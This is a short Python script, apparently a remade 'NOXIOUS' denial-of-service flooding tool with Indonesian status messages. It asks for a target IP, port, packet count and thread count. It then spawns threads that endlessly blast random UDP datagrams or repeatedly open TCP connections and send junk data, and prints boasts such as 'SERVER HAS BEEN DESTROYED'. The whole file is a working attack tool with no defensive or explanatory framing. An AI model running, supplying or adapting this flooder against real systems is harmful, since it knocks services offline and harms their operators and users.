import random
import socket
import threading
import os

os.system("clear")
print("╔════════════════╗")
print("══𝐍 𝐎 𝐗 𝐈 𝐎 𝐔 𝐒 ══")
print("╚════════════════╝")
print("TOOLS BY ΣXCRUSHER")
print("REMAKE BY NOXIOUS")
ip = str(input(" NOXIOUS | Ip:"))
port = int(input(" NOXIOUS | Port:"))
choice = str(input(" NOXIOUS | Gas Gak Ni?(y/n):"))
times = int(input(" NOXIOUS | Packets:"))
threads = int(input(" NOXIOUS | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | SEDANG MENGIRIM KEJUTAN... |")
		except:
			print("[!] | SERVER HAS BEEN DESTROYED |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NOXIOUS X EXCRUSHER")
		except:
			s.close()
			print("[*] |PAKET SEDANG OTW|")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
